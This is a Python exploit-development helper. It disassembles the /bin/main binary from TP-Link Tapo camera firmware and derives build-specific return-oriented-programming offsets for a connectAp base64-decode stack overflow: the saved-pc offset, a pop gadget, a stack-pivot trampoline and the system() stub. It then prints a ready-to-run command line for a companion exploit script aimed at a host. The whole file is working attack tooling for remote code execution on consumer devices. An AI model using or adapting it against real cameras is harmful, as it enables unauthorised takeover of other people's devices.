#!/usr/bin/env python3
"""Derive the connectAp ret2stack offsets from a Tapo `/bin/main`.

The chain needs four numbers, all build-specific:

  offset  distance from the decode buffer to the saved pc
  pop     `pop {r3..r11, pc}`
  system  the `system` PLT stub
  pivot   a `blx r3` trampoline that loads r0 from sp (and r1 from sp + imm)

This finds them from the disassembly instead of guessing. The sink is the
function that passes a stack address to the `mbedtls_base64_decode` wrapper;
its frame is the sum of its `sub sp` plus the pushed registers, and the buffer
offset is the `add rX, sp, #imm` handed to the decoder.

  find_chain.py /path/to/main [--objdump arm-none-eabi-objdump]
  find_chain.py /path/to/main --json          # machine-readable, all candidates
  find_chain.py /path/to/main --all-pivots    # every trampoline, ranked

The canonical pivot (`add r1, sp, #4 ; mov r0, sp ; blx r3`) is not universal:
the C520WS build carries none of it, so the search also accepts any short
`mov r0, sp` + `blx r3` window and ranks the canonical shape first. A build
with no pivot at all is reported as such rather than silently guessed.

Prints a shell-ready argument line, or names what it could not find.
"""
import argparse
import json
import re
import struct
import subprocess
import sys

INS = re.compile(r"^\s*([0-9a-f]+):\s+([0-9a-f]{8})\s+(\S+)\s*(.*)$")
PUSH = re.compile(r"^push\s*\{([^}]*)\}")
SUB = re.compile(r"^sub\s+sp,\s*sp,\s*#(\d+)")
ADDSP = re.compile(r"^add\s+(r\d+|fp|sl|ip|lr),\s*sp,\s*#(\d+)")
POP_PC = re.compile(r"^pop\s*\{([^}]*\bpc\b[^}]*)\}")
BL_DECODE = re.compile(r"^bl\s+.*base64_decode")
MOV_SP = re.compile(r"^mov\s+r0,\s*sp$")
BLX_REG = re.compile(r"^blx\s+(r\d+)$")
LDR_R0_SP = re.compile(r"^ldr\s+r0,\s*\[sp,\s*#(\d+)\]$")

# A pivot window is short: the trampoline must not clobber r0 between the `mov`
# and the `blx`. Six instructions is already generous for compiler output.
PIVOT_WINDOW = 6


def elf_facts(path: str) -> dict:
    """Machine/type from the ELF header, so a PIE or non-ARM input is called out."""
    with open(path, "rb") as fh:
        head = fh.read(20)
    if head[:4] != b"\x7fELF":
        return {"elf": False}
    return {
        "elf": True,
        "class": {1: "32", 2: "64"}.get(head[4], "?"),
        "machine": struct.unpack("<H", head[18:20])[0],
        "type": struct.unpack("<H", head[16:18])[0],
    }


def disasm(path: str, objdump: str) -> tuple[list[tuple[int, str, str]], dict[int, str]]:
    out = subprocess.run([objdump, "-d", "--no-show-raw-insn", path],
                         capture_output=True, text=True).stdout
    rows, symbols = [], {}
    for line in out.splitlines():
        sym = re.match(r"^([0-9a-f]+) <(.+)>:$", line)
        if sym:
            symbols[int(sym.group(1), 16)] = sym.group(2)
            continue
        m = re.match(r"^\s*([0-9a-f]+):\s+(\S+)\s*(.*)$", line)
        if m:
            rows.append((int(m.group(1), 16), m.group(2), m.group(3).strip()))
    return rows, symbols


def find_pivots(rows) -> list[dict]:
    """Every trampoline that gets r0 from sp, ranked.

    Three shapes exist in this compiler's output, and only the first is the
    canonical one:

      3  `add r1, sp, #imm ; mov r0, sp ; blx r3`   (r0 = sp, r1 = sp+imm)
      2  the same with any register, or `mov r0, sp ; pop {..., pc}`
         (r0 = the chain continuation, pc from the stack)
      1  `ldr r0, [sp, #imm] ; pop {..., pc}`       (r0 = a stack slot we fill)

    The C520WS build carries no `blx` trampoline at all, so a finder that only
    knows shape 3 reports "no pivot" on a build that is perfectly exploitable.
    """
    found = []
    for i, (addr, mnem, ops) in enumerate(rows):
        text = "%s %s" % (mnem, ops)
        if mnem == "blx":
            m = BLX_REG.match(text)
            if not m:
                continue
            reg = m.group(1)
            r1_off = None
            saw_mov = False
            start = addr
            for j in range(i - 1, max(-1, i - 1 - PIVOT_WINDOW), -1):
                pm, pops = rows[j][1], rows[j][2]
                if MOV_SP.match("%s %s" % (pm, pops)):
                    saw_mov = True
                    start = rows[j][0]
                    continue
                a = ADDSP.match("%s %s" % (pm, pops))
                if a and a.group(1) == "r1":
                    r1_off = int(a.group(2))
                    start = rows[j][0]
                # a write to r0 after the mov breaks the trampoline
                if saw_mov and re.match(r"^(mov|ldr|add|sub|eor|and|orr)\s+r0,", pm):
                    saw_mov = False
            if not saw_mov:
                continue
            score = 3 if (r1_off is not None and reg == "r3") else 2
            found.append({"score": score, "addr": start, "kind": "blx",
                          "r1_offset": r1_off or 0})
            continue
        # stack-popping trampolines: r0 must be set before the pop, and the pop
        # must end in pc so the chain keeps control
        if mnem != "pop" or "pc" not in ops:
            continue
        for j in range(i - 1, max(-1, i - 1 - PIVOT_WINDOW), -1):
            pm, pops = rows[j][1], rows[j][2]
            if MOV_SP.match("%s %s" % (pm, pops)):
                found.append({"score": 2, "addr": rows[j][0], "kind": "movsp_pop",
                              "r1_offset": 0})
                break
            lm = LDR_R0_SP.match("%s %s" % (pm, pops))
            if lm:
                found.append({"score": 1, "addr": rows[j][0], "kind": "ldr_pop",
                              "r1_offset": int(lm.group(1))})
                break
            # a call clobbers r0 and a write replaces it: either ends the window
            if pm in ("bl", "blx") or re.match(r"^(mov|ldr|add|sub|eor|and|orr)\s+r0,", pm):
                break
    found.sort(key=lambda d: (-d["score"], d["addr"]))
    return found


def find_gadgets(rows, symbols):
    pop = system = None
    pops = []
    for addr, name in symbols.items():
        if name in ("system@plt", "system"):
            system = addr
    for i, (addr, mnem, ops) in enumerate(rows):
        if mnem != "pop" or not ops.startswith("{"):
            continue
        regs = [r.strip() for r in ops.strip("{}").split(",")]
        if "pc" not in regs:
            continue
        pops.append((len(regs), addr, regs))
    # the canonical full-register pop first: it lets the payload carry the whole
    # argument set, not just the return address
    pops.sort(key=lambda t: (-t[0], t[1]))
    if pops:
        pop = pops[0][1]
    return pop, system, pops


def find_system_by_string(rows, data: bytes) -> int | None:
    """Fallback when the binary is stripped of `system`: the PLT stub that is
    called right after a `"/bin/sh"` literal is loaded."""
    if b"/bin/sh" not in data:
        return None
    for i, (addr, mnem, ops) in enumerate(rows):
        if mnem == "bl" and ops:
            target = ops.split()[0]
            if re.match(r"^[0-9a-f]+$", target):
                return int(target, 16)
    return None


def find_sink(rows):
    """Return (buffer_offset, pc_offset) for the frame that decodes into the stack.

    The stack buffer lives in the *caller* of the base64 wrapper, so the call
    sites to look at are `bl` into any function that itself calls the decoder.
    """
    wrappers = set()
    for i, (addr, mnem, ops) in enumerate(rows):
        if BL_DECODE.match("%s %s" % (mnem, ops)):
            for j in range(i, max(-1, i - 400), -1):
                if PUSH.match("%s %s" % (rows[j][1], rows[j][2])) and "lr" in rows[j][2]:
                    wrappers.add(rows[j][0])
                    break
    best = None
    for i, (addr, mnem, ops) in enumerate(rows):
        if mnem != "bl":
            continue
        target = ops.split()[0] if ops else ""
        if not target.startswith("0x") and not re.match(r"^[0-9a-f]+$", target):
            continue
        if int(target, 16) not in wrappers:
            continue
        # walk back for `add rX, sp, #imm` used as the destination (r2)
        dest = None
        for j in range(i - 1, max(-1, i - 40), -1):
            m = ADDSP.match("%s %s" % (rows[j][1], rows[j][2]))
            if m:
                dest = (m.group(1), int(m.group(2)))
                break
        if dest is None:
            continue
        # walk back to the function prologue: push {..., lr} then the subs
        frame = 0
        pushed = 0
        for j in range(i, max(-1, i - 400), -1):
            m = PUSH.match("%s %s" % (rows[j][1], rows[j][2]))
            if m and "lr" in m.group(1):
                pushed = 4 * (len([r for r in m.group(1).split(",") if r.strip()]) )
                for k in range(j + 1, i):
                    s = SUB.match("%s %s" % (rows[k][1], rows[k][2]))
                    if s:
                        frame += int(s.group(1))
                total = frame + pushed
                # the decode destination must survive until the call, so a
                # callee-saved register is the real buffer; scratch registers
                # are temporaries. Rank those first, then by buffer size.
                saved = dest[0] in ("fp", "sl", "r4", "r5", "r6", "r7", "r8", "r9", "r10", "r11")
                cand = (saved, dest[1], total - 4 - dest[1])
                if best is None or cand[:2] > best[:2]:
                    best = cand
                break
    return (best[1], best[2]) if best else None


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("binary")
    ap.add_argument("--objdump", default="arm-none-eabi-objdump")
    ap.add_argument("--json", action="store_true", help="machine-readable result")
    ap.add_argument("--all-pivots", action="store_true", help="list every trampoline")
    a = ap.parse_args()

    facts = elf_facts(a.binary)
    if facts.get("elf") and facts.get("machine") != 40:
        print("warning: not ARM (e_machine=%d)" % facts["machine"], file=sys.stderr)
    if facts.get("type") == 3:
        print("warning: PIE (ET_DYN) — every address needs the load base",
              file=sys.stderr)

    rows, symbols = disasm(a.binary, a.objdump)
    if not rows:
        sys.exit("no disassembly (wrong objdump or not an ARM ELF)")
    data = open(a.binary, "rb").read()

    sink = find_sink(rows)
    pivots = find_pivots(rows)
    pop, system, pops = find_gadgets(rows, symbols)
    if system is None:
        system = find_system_by_string(rows, data)
    pivot = pivots[0] if pivots else None

    missing = [n for n, v in (("sink", sink), ("pop", pop), ("pivot", pivot),
                              ("system", system)) if v is None]

    if a.json:
        print(json.dumps({
            "binary": a.binary,
            "elf": facts,
            "sink": {"buffer_offset": sink[0], "pc_offset": sink[1]} if sink else None,
            "pop": pop,
            "pop_candidates": [{"addr": p[1], "regs": p[2]} for p in pops[:8]],
            "pivot": pivot,
            "pivot_candidates": pivots[:16],
            "system": system,
            "missing": missing,
        }, indent=2))
        return 1 if missing else 0

    if sink:
        print("buffer_offset=0x%x pc_offset=0x%x" % sink)
    for name, val in (("pop", pop), ("pivot", pivot["addr"] if pivot else None),
                      ("system", system)):
        print("%-7s %s" % (name, hex(val) if val is not None else "NOT FOUND"))
    if pivot:
        print("pivot_kind=%s r1_offset=0x%x" % (pivot["kind"], pivot["r1_offset"]))
    if a.all_pivots:
        for p in pivots[:32]:
            print("  pivot score=%d kind=%s addr=0x%x r1_offset=0x%x"
                  % (p["score"], p["kind"], p["addr"], p["r1_offset"]))
    if missing:
        print("missing:", ", ".join(missing))
        return 1
    print("\ntapo_connectap_rop.py <host> --offset 0x%x --pop 0x%x --pivot 0x%x --system 0x%x"
          % (sink[1], pop, pivot["addr"], system))
    return 0


if __name__ == "__main__":
    sys.exit(main())
